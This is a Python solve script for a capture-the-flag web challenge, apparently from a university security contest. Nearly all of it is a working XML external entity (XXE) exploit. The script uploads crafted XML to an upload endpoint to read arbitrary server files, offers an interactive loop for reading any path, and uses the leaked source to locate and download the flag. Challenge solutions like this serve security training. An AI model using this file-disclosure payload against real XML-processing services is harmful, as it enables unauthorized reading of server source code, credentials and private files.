import requests
import base64
import re

from pyfiglet import Figlet
from xtermcolor import colorize


def read_file(path):
    st = f'<?xml version="1.0" encoding="UTF-8"?>\n' \
         f'<!DOCTYPE foo [ \n' \
         f'    <!ENTITY licenseNumber SYSTEM "file://{path}"> \n' \
         f']>\n' \
         f'<licenseNumber>\n' \
         f'    `&licenseNumber;`\n' \
         f'</licenseNumber>\n'

    files = {'file': ('x.xml', st)}

    r = requests.post('https://manual-for-the-apocalypse.secchallenge.crysys.hu/upload.php',
                      files=files)

    return base64.b64decode(r.text).decode("utf-8")

def shell():
    while True:
        st = input('>')
        if st == '':
            break
        print(read_file(st))


def solve():
    print(Figlet(font='slant', width=200).renderText("Manual for the apocalypse"))

    url_base = 'https://manual-for-the-apocalypse.secchallenge.crysys.hu/'
    print(f'Url base: ' + url_base)
    print(f'Obtaining source for upload.php...')
    src = read_file('/var/www/html/upload.php')
    flag_location = re.search('"(very_secret_hidden_folder.*)"', src).group(1)

    flag_url = f'{url_base}/{flag_location}'
    print(f'Downloading flag from {flag_url}')
    flag = requests.get(flag_url).text
    print('Your flag is: ' + colorize(flag, ansi=2))


solve()
